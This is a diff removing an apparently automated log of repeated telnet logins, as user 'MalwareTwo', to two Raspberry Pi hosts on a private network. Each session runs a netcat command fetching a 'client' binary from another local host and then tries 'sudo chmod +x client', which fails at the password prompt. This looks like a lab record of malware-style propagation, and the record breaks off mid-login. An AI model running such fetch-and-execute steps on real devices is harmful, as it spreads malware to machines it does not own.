@@ -1,387 +1,0 @@
-spawn telnet 192.168.1.95 23
-Trying 192.168.1.95...
-Connected to 192.168.1.95.
-Escape character is '^]'.
-Debian GNU/Linux 11
-raspberry login: MalwareTwo
-Password: 
-Linux raspberry 5.10.0-15-686 #1 SMP Debian 5.10.120-1 (2022-06-09) i686
-
-The programs included with the Debian GNU/Linux system are free software;
-the exact distribution terms for each program are described in the
-individual files in /usr/share/doc/*/copyright.
-
-Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
-permitted by applicable law.
-Last login: Sat Jan 14 17:03:28 CET 2023 from 192.168.1.67 on pts/10
-[?2004h]0;MalwareTwo@raspberry: ~[01;32mMalwareTwo@raspberry[00m:[01;34m~ $[00m netcat -w 5 -q 5 192.168.1.10 9899 > client
-[?2004l[?2004h]0;MalwareTwo@raspberry: ~[01;32mMalwareTwo@raspberry[00m:[01;34m~ $[00m 
-[?2004l[?2004h]0;MalwareTwo@raspberry: ~[01;32mMalwareTwo@raspberry[00m:[01;34m~ $[00m sudo chmod +x client
-[?2004l[sudo] password for MalwareTwo: sh: 1: : not found
-spawn telnet 192.168.1.95 23
-Trying 192.168.1.95...
-Connected to 192.168.1.95.
-Escape character is '^]'.
-Debian GNU/Linux 11
-raspberry login: MalwareTwo
-Password: 
-Linux raspberry 5.10.0-15-686 #1 SMP Debian 5.10.120-1 (2022-06-09) i686
-
-The programs included with the Debian GNU/Linux system are free software;
-the exact distribution terms for each program are described in the
-individual files in /usr/share/doc/*/copyright.
-
-Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
-permitted by applicable law.
-Last login: Sat Jan 14 17:10:36 CET 2023 from 192.168.1.41 on pts/9
-[?2004h]0;MalwareTwo@raspberry: ~[01;32mMalwareTwo@raspberry[00m:[01;34m~ $[00m netcat -w 5 -q 5 192.168.1.10 9899 > client
-[?2004l[?2004h]0;MalwareTwo@raspberry: ~[01;32mMalwareTwo@raspberry[00m:[01;34m~ $[00m 
-[?2004l[?2004h]0;MalwareTwo@raspberry: ~[01;32mMalwareTwo@raspberry[00m:[01;34m~ $[00m sudo chmod +x client
-[?2004l[sudo] password for MalwareTwo: sh: 1: : not found
-spawn telnet 192.168.1.23 23
-Trying 192.168.1.23...
-Connected to 192.168.1.23.
-Escape character is '^]'.
-Debian GNU/Linux 11
-raspberry login: MalwareTwo
-Password: 
-Linux raspberry 5.10.0-15-686 #1 SMP Debian 5.10.120-1 (2022-06-09) i686
-
-The programs included with the Debian GNU/Linux system are free software;
-the exact distribution terms for each program are described in the
-individual files in /usr/share/doc/*/copyright.
-
-Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
-permitted by applicable law.
-Last login: Sat Jan 14 17:12:41 CET 2023 from 192.168.1.35 on pts/8
-[?2004h]0;MalwareTwo@raspberry: ~[01;32mMalwareTwo@raspberry[00m:[01;34m~ $[00m netcat -w 5 -q 5 192.168.1.10 9899 > client
-[?2004l[?2004h]0;MalwareTwo@raspberry: ~[01;32mMalwareTwo@raspberry[00m:[01;34m~ $[00m 
-[?2004l[?2004h]0;MalwareTwo@raspberry: ~[01;32mMalwareTwo@raspberry[00m:[01;34m~ $[00m sudo chmod +x client
-[?2004l[sudo] password for MalwareTwo: sh: 1: : not found
-spawn telnet 192.168.1.95 23
-Trying 192.168.1.95...
-Connected to 192.168.1.95.
-Escape character is '^]'.
-Debian GNU/Linux 11
-raspberry login: MalwareTwo
-Password: 
-Linux raspberry 5.10.0-15-686 #1 SMP Debian 5.10.120-1 (2022-06-09) i686
-
-The programs included with the Debian GNU/Linux system are free software;
-the exact distribution terms for each program are described in the
-individual files in /usr/share/doc/*/copyright.
-
-Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
-permitted by applicable law.
-Last login: Sat Jan 14 17:14:49 CET 2023 from 192.168.1.47 on pts/8
-[?2004h]0;MalwareTwo@raspberry: ~[01;32mMalwareTwo@raspberry[00m:[01;34m~ $[00m netcat -w 5 -q 5 192.168.1.10 9899 > client
-[?2004l[?2004h]0;MalwareTwo@raspberry: ~[01;32mMalwareTwo@raspberry[00m:[01;34m~ $[00m 
-[?2004l[?2004h]0;MalwareTwo@raspberry: ~[01;32mMalwareTwo@raspberry[00m:[01;34m~ $[00m sudo chmod +x client
-[?2004l[sudo] password for MalwareTwo: sh: 1: : not found
-spawn telnet 192.168.1.23 23
-Trying 192.168.1.23...
-Connected to 192.168.1.23.
-Escape character is '^]'.
-Debian GNU/Linux 11
-raspberry login: MalwareTwo
-Password: 
-Linux raspberry 5.10.0-15-686 #1 SMP Debian 5.10.120-1 (2022-06-09) i686
-
-The programs included with the Debian GNU/Linux system are free software;
-the exact distribution terms for each program are described in the
-individual files in /usr/share/doc/*/copyright.
-
-Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
-permitted by applicable law.
-Last login: Sat Jan 14 17:17:01 CET 2023 from 192.168.1.22 on pts/10
-[?2004h]0;MalwareTwo@raspberry: ~[01;32mMalwareTwo@raspberry[00m:[01;34m~ $[00m netcat -w 5 -q 5 192.168.1.10 9899 > client
-[?2004l[?2004h]0;MalwareTwo@raspberry: ~[01;32mMalwareTwo@raspberry[00m:[01;34m~ $[00m 
-[?2004l[?2004h]0;MalwareTwo@raspberry: ~[01;32mMalwareTwo@raspberry[00m:[01;34m~ $[00m sudo chmod +x client
-[?2004l[sudo] password for MalwareTwo: sh: 1: : not found
-spawn telnet 192.168.1.95 23
-Trying 192.168.1.95...
-Connected to 192.168.1.95.
-Escape character is '^]'.
-Debian GNU/Linux 11
-raspberry login: MalwareTwo
-Password: 
-Linux raspberry 5.10.0-15-686 #1 SMP Debian 5.10.120-1 (2022-06-09) i686
-
-The programs included with the Debian GNU/Linux system are free software;
-the exact distribution terms for each program are described in the
-individual files in /usr/share/doc/*/copyright.
-
-Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
-permitted by applicable law.
-Last login: Sat Jan 14 17:19:18 CET 2023 from 192.168.1.2 on pts/8
-[?2004h]0;MalwareTwo@raspberry: ~[01;32mMalwareTwo@raspberry[00m:[01;34m~ $[00m netcat -w 5 -q 5 192.168.1.10 9899 > client
-[?2004l[?2004h]0;MalwareTwo@raspberry: ~[01;32mMalwareTwo@raspberry[00m:[01;34m~ $[00m 
-[?2004l[?2004h]0;MalwareTwo@raspberry: ~[01;32mMalwareTwo@raspberry[00m:[01;34m~ $[00m sudo chmod +x client
-[?2004l[sudo] password for MalwareTwo: sh: 1: : not found
-spawn telnet 192.168.1.23 23
-Trying 192.168.1.23...
-Connected to 192.168.1.23.
-Escape character is '^]'.
-Debian GNU/Linux 11
-raspberry login: MalwareTwo
-Password: 
-Linux raspberry 5.10.0-15-686 #1 SMP Debian 5.10.120-1 (2022-06-09) i686
-
-The programs included with the Debian GNU/Linux system are free software;
-the exact distribution terms for each program are described in the
-individual files in /usr/share/doc/*/copyright.
-
-Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
-permitted by applicable law.
-Last login: Sat Jan 14 17:21:24 CET 2023 from 192.168.1.47 on pts/3
-[?2004h]0;MalwareTwo@raspberry: ~[01;32mMalwareTwo@raspberry[00m:[01;34m~ $[00m netcat -w 5 -q 5 192.168.1.10 9899 > client
-[?2004l[?2004h]0;MalwareTwo@raspberry: ~[01;32mMalwareTwo@raspberry[00m:[01;34m~ $[00m 
-[?2004l[?2004h]0;MalwareTwo@raspberry: ~[01;32mMalwareTwo@raspberry[00m:[01;34m~ $[00m sudo chmod +x client
-[?2004l[sudo] password for MalwareTwo: sh: 1: : not found
-spawn telnet 192.168.1.95 23
-Trying 192.168.1.95...
-Connected to 192.168.1.95.
-Escape character is '^]'.
-Debian GNU/Linux 11
-raspberry login: MalwareTwo
-Password: 
-Linux raspberry 5.10.0-15-686 #1 SMP Debian 5.10.120-1 (2022-06-09) i686
-
-The programs included with the Debian GNU/Linux system are free software;
-the exact distribution terms for each program are described in the
-individual files in /usr/share/doc/*/copyright.
-
-Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
-permitted by applicable law.
-Last login: Sat Jan 14 17:23:31 CET 2023 from 192.168.1.81 on pts/9
-[?2004h]0;MalwareTwo@raspberry: ~[01;32mMalwareTwo@raspberry[00m:[01;34m~ $[00m netcat -w 5 -q 5 192.168.1.10 9899 > client
-[?2004l[?2004h]0;MalwareTwo@raspberry: ~[01;32mMalwareTwo@raspberry[00m:[01;34m~ $[00m 
-[?2004l[?2004h]0;MalwareTwo@raspberry: ~[01;32mMalwareTwo@raspberry[00m:[01;34m~ $[00m sudo chmod +x client
-[?2004l[sudo] password for MalwareTwo: sh: 1: : not found
-spawn telnet 192.168.1.23 23
-Trying 192.168.1.23...
-Connected to 192.168.1.23.
-Escape character is '^]'.
-Debian GNU/Linux 11
-raspberry login: MalwareTwo
-Password: 
-Linux raspberry 5.10.0-15-686 #1 SMP Debian 5.10.120-1 (2022-06-09) i686
-
-The programs included with the Debian GNU/Linux system are free software;
-the exact distribution terms for each program are described in the
-individual files in /usr/share/doc/*/copyright.
-
-Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
-permitted by applicable law.
-Last login: Sat Jan 14 17:25:40 CET 2023 from 192.168.1.22 on pts/10
-[?2004h]0;MalwareTwo@raspberry: ~[01;32mMalwareTwo@raspberry[00m:[01;34m~ $[00m netcat -w 5 -q 5 192.168.1.10 9899 > client
-[?2004l[?2004h]0;MalwareTwo@raspberry: ~[01;32mMalwareTwo@raspberry[00m:[01;34m~ $[00m 
-[?2004l[?2004h]0;MalwareTwo@raspberry: ~[01;32mMalwareTwo@raspberry[00m:[01;34m~ $[00m sudo chmod +x client
-[?2004l[sudo] password for MalwareTwo: sh: 1: : not found
-spawn telnet 192.168.1.95 23
-Trying 192.168.1.95...
-Connected to 192.168.1.95.
-Escape character is '^]'.
-Debian GNU/Linux 11
-raspberry login: MalwareTwo
-Password: 
-Linux raspberry 5.10.0-15-686 #1 SMP Debian 5.10.120-1 (2022-06-09) i686
-
-The programs included with the Debian GNU/Linux system are free software;
-the exact distribution terms for each program are described in the
-individual files in /usr/share/doc/*/copyright.
-
-Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
-permitted by applicable law.
-Last login: Sat Jan 14 17:27:51 CET 2023 from 192.168.1.21 on pts/9
-[?2004h]0;MalwareTwo@raspberry: ~[01;32mMalwareTwo@raspberry[00m:[01;34m~ $[00m netcat -w 5 -q 5 192.168.1.10 9899 > client
-[?2004l[?2004h]0;MalwareTwo@raspberry: ~[01;32mMalwareTwo@raspberry[00m:[01;34m~ $[00m 
-[?2004l[?2004h]0;MalwareTwo@raspberry: ~[01;32mMalwareTwo@raspberry[00m:[01;34m~ $[00m sudo chmod +x client
-[?2004l[sudo] password for MalwareTwo: sh: 1: : not found
-spawn telnet 192.168.1.23 23
-Trying 192.168.1.23...
-Connected to 192.168.1.23.
-Escape character is '^]'.
-Debian GNU/Linux 11
-raspberry login: MalwareTwo
-Password: 
-Linux raspberry 5.10.0-15-686 #1 SMP Debian 5.10.120-1 (2022-06-09) i686
-
-The programs included with the Debian GNU/Linux system are free software;
-the exact distribution terms for each program are described in the
-individual files in /usr/share/doc/*/copyright.
-
-Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
-permitted by applicable law.
-Last login: Sat Jan 14 17:30:06 CET 2023 from 192.168.1.37 on pts/15
-[?2004h]0;MalwareTwo@raspberry: ~[01;32mMalwareTwo@raspberry[00m:[01;34m~ $[00m netcat -w 5 -q 5 192.168.1.10 9899 > client
-[?2004l[?2004h]0;MalwareTwo@raspberry: ~[01;32mMalwareTwo@raspberry[00m:[01;34m~ $[00m 
-[?2004l[?2004h]0;MalwareTwo@raspberry: ~[01;32mMalwareTwo@raspberry[00m:[01;34m~ $[00m sudo chmod +x client
-[?2004l[sudo] password for MalwareTwo: sh: 1: : not found
-spawn telnet 192.168.1.95 23
-Trying 192.168.1.95...
-Connected to 192.168.1.95.
-Escape character is '^]'.
-Debian GNU/Linux 11
-raspberry login: MalwareTwo
-Password: 
-Linux raspberry 5.10.0-15-686 #1 SMP Debian 5.10.120-1 (2022-06-09) i686
-
-The programs included with the Debian GNU/Linux system are free software;
-the exact distribution terms for each program are described in the
-individual files in /usr/share/doc/*/copyright.
-
-Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
-permitted by applicable law.
-Last login: Sat Jan 14 17:32:12 CET 2023 from 192.168.1.4 on pts/8
-[?2004h]0;MalwareTwo@raspberry: ~[01;32mMalwareTwo@raspberry[00m:[01;34m~ $[00m netcat -w 5 -q 5 192.168.1.10 9899 > client
-[?2004l[?2004h]0;MalwareTwo@raspberry: ~[01;32mMalwareTwo@raspberry[00m:[01;34m~ $[00m 
-[?2004l[?2004h]0;MalwareTwo@raspberry: ~[01;32mMalwareTwo@raspberry[00m:[01;34m~ $[00m sudo chmod +x client
-[?2004l[sudo] password for MalwareTwo: sh: 1: : not found
-spawn telnet 192.168.1.23 23
-Trying 192.168.1.23...
-Connected to 192.168.1.23.
-Escape character is '^]'.
-Debian GNU/Linux 11
-raspberry login: MalwareTwo
-Password: 
-Linux raspberry 5.10.0-15-686 #1 SMP Debian 5.10.120-1 (2022-06-09) i686
-
-The programs included with the Debian GNU/Linux system are free software;
-the exact distribution terms for each program are described in the
-individual files in /usr/share/doc/*/copyright.
-
-Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
-permitted by applicable law.
-Last login: Sat Jan 14 17:34:23 CET 2023 from 192.168.1.11 on pts/15
-[?2004h]0;MalwareTwo@raspberry: ~[01;32mMalwareTwo@raspberry[00m:[01;34m~ $[00m netcat -w 5 -q 5 192.168.1.10 9899 > client
-[?2004l[?2004h]0;MalwareTwo@raspberry: ~[01;32mMalwareTwo@raspberry[00m:[01;34m~ $[00m 
-[?2004l[?2004h]0;MalwareTwo@raspberry: ~[01;32mMalwareTwo@raspberry[00m:[01;34m~ $[00m sudo chmod +x client
-[?2004l[sudo] password for MalwareTwo: sh: 1: : not found
-spawn telnet 192.168.1.95 23
-Trying 192.168.1.95...
-Connected to 192.168.1.95.
-Escape character is '^]'.
-Debian GNU/Linux 11
-raspberry login: MalwareTwo
-Password: 
-Linux raspberry 5.10.0-15-686 #1 SMP Debian 5.10.120-1 (2022-06-09) i686
-
-The programs included with the Debian GNU/Linux system are free software;
-the exact distribution terms for each program are described in the
-individual files in /usr/share/doc/*/copyright.
-
-Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
-permitted by applicable law.
-Last login: Sat Jan 14 17:36:35 CET 2023 from 192.168.1.24 on pts/9
-[?2004h]0;MalwareTwo@raspberry: ~[01;32mMalwareTwo@raspberry[00m:[01;34m~ $[00m netcat -w 5 -q 5 192.168.1.10 9899 > client
-[?2004l[?2004h]0;MalwareTwo@raspberry: ~[01;32mMalwareTwo@raspberry[00m:[01;34m~ $[00m 
-[?2004l[?2004h]0;MalwareTwo@raspberry: ~[01;32mMalwareTwo@raspberry[00m:[01;34m~ $[00m sudo chmod +x client
-[?2004l[sudo] password for MalwareTwo: sh: 1: : not found
-spawn telnet 192.168.1.23 23
-Trying 192.168.1.23...
-Connected to 192.168.1.23.
-Escape character is '^]'.
-Debian GNU/Linux 11
-raspberry login: MalwareTwo
-Password: 
-Linux raspberry 5.10.0-15-686 #1 SMP Debian 5.10.120-1 (2022-06-09) i686
-
-The programs included with the Debian GNU/Linux system are free software;
-the exact distribution terms for each program are described in the
-individual files in /usr/share/doc/*/copyright.
-
-Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
-permitted by applicable law.
-Last login: Sat Jan 14 17:38:40 CET 2023 from 192.168.1.82 on pts/8
-[?2004h]0;MalwareTwo@raspberry: ~[01;32mMalwareTwo@raspberry[00m:[01;34m~ $[00m netcat -w 5 -q 5 192.168.1.10 9899 > client
-[?2004l[?2004h]0;MalwareTwo@raspberry: ~[01;32mMalwareTwo@raspberry[00m:[01;34m~ $[00m 
-[?2004l[?2004h]0;MalwareTwo@raspberry: ~[01;32mMalwareTwo@raspberry[00m:[01;34m~ $[00m sudo chmod +x client
-[?2004l[sudo] password for MalwareTwo: sh: 1: : not found
-spawn telnet 192.168.1.95 23
-Trying 192.168.1.95...
-Connected to 192.168.1.95.
-Escape character is '^]'.
-Debian GNU/Linux 11
-raspberry login: MalwareTwo
-Password: 
-Linux raspberry 5.10.0-15-686 #1 SMP Debian 5.10.120-1 (2022-06-09) i686
-
-The programs included with the Debian GNU/Linux system are free software;
-the exact distribution terms for each program are described in the
-individual files in /usr/share/doc/*/copyright.
-
-Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
-permitted by applicable law.
-Last login: Sat Jan 14 17:43:01 CET 2023 from 192.168.1.42 on pts/3
-[?2004h]0;MalwareTwo@raspberry: ~[01;32mMalwareTwo@raspberry[00m:[01;34m~ $[00m netcat -w 5 -q 5 192.168.1.10 9899 > client
-[?2004l[?2004h]0;MalwareTwo@raspberry: ~[01;32mMalwareTwo@raspberry[00m:[01;34m~ $[00m 
-[?2004l[?2004h]0;MalwareTwo@raspberry: ~[01;32mMalwareTwo@raspberry[00m:[01;34m~ $[00m sudo chmod +x client
-[?2004l[sudo] password for MalwareTwo: sh: 1: : not found
-spawn telnet 192.168.1.23 23
-Trying 192.168.1.23...
-Connected to 192.168.1.23.
-Escape character is '^]'.
-Debian GNU/Linux 11
-raspberry login: MalwareTwo
-Password: 
-Linux raspberry 5.10.0-15-686 #1 SMP Debian 5.10.120-1 (2022-06-09) i686
-
-The programs included with the Debian GNU/Linux system are free software;
-the exact distribution terms for each program are described in the
-individual files in /usr/share/doc/*/copyright.
-
-Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
-permitted by applicable law.
-Last login: Sat Jan 14 17:45:24 CET 2023 from 192.168.1.27 on pts/10
-[?2004h]0;MalwareTwo@raspberry: ~[01;32mMalwareTwo@raspberry[00m:[01;34m~ $[00m netcat -w 5 -q 5 192.168.1.10 9899 > client
-[?2004l[?2004h]0;MalwareTwo@raspberry: ~[01;32mMalwareTwo@raspberry[00m:[01;34m~ $[00m 
-[?2004l[?2004h]0;MalwareTwo@raspberry: ~[01;32mMalwareTwo@raspberry[00m:[01;34m~ $[00m sudo chmod +x client
-[?2004l[sudo] password for MalwareTwo: sh: 1: : not found
-spawn telnet 192.168.1.95 23
-Trying 192.168.1.95...
-Connected to 192.168.1.95.
-Escape character is '^]'.
-Debian GNU/Linux 11
-raspberry login: MalwareTwo
-Password: 
-Linux raspberry 5.10.0-15-686 #1 SMP Debian 5.10.120-1 (2022-06-09) i686
-
-The programs included with the Debian GNU/Linux system are free software;
-the exact distribution terms for each program are described in the
-individual files in /usr/share/doc/*/copyright.
-
-Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
-permitted by applicable law.
-Last login: Sat Jan 14 17:47:22 CET 2023 from 192.168.1.7 on pts/9
-[?2004h]0;MalwareTwo@raspberry: ~[01;32mMalwareTwo@raspberry[00m:[01;34m~ $[00m netcat -w 5 -q 5 192.168.1.10 9899 > client
-[?2004l[?2004h]0;MalwareTwo@raspberry: ~[01;32mMalwareTwo@raspberry[00m:[01;34m~ $[00m 
-[?2004l[?2004h]0;MalwareTwo@raspberry: ~[01;32mMalwareTwo@raspberry[00m:[01;34m~ $[00m sudo chmod +x client
-[?2004l[sudo] password for MalwareTwo: sh: 1: : not found
-spawn telnet 192.168.1.23 23
-Trying 192.168.1.23...
-Connected to 192.168.1.23.
-Escape character is '^]'.
-Debian GNU/Linux 11
-raspberry login: MalwareTwo
-Password: 
-Linux raspberry 5.10.0-15-686 #1 SMP Debian 5.10.120-1 (2022-06-09) i686
-
-The programs included with the Debian GNU/Linux system are free software;
-the exact distribution terms for each program are described in the
-individual files in /usr/share/doc/*/copyright.
-
-Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
-permitted by applicable law.
-Last login: Sat Jan 14 17:49:33 CET 2023 from 192.168.1.85 on pts/17
-[?2004h]0;MalwareTwo@raspberry: ~[01;32mMalwareTwo@raspberry[00m:[01;34m~ $[00m netcat -w 5 -q 5 192.168.1.10 9899 > client
-[?2004l[?2004h]0;MalwareTwo@raspberry: ~[01;32mMalwareTwo@raspberry[00m:[01;34m~ $[00m 
-[?2004l[?2004h]0;MalwareTwo@raspberry: ~[01;32mMalwareTwo@raspberry[00m:[01;34m~ $[00m sudo chmod +x client
-[?2004l[sudo] password for MalwareTwo: sh: 1: : not found
-spawn telnet 192.168.1.95 23
-Trying 192.168.1.95...
-Connected to 192.168.1.95.
-Escape character is '^]'.
-Debian GNU/Linux 11
-raspberry login: MalwareTwo
-Password: 
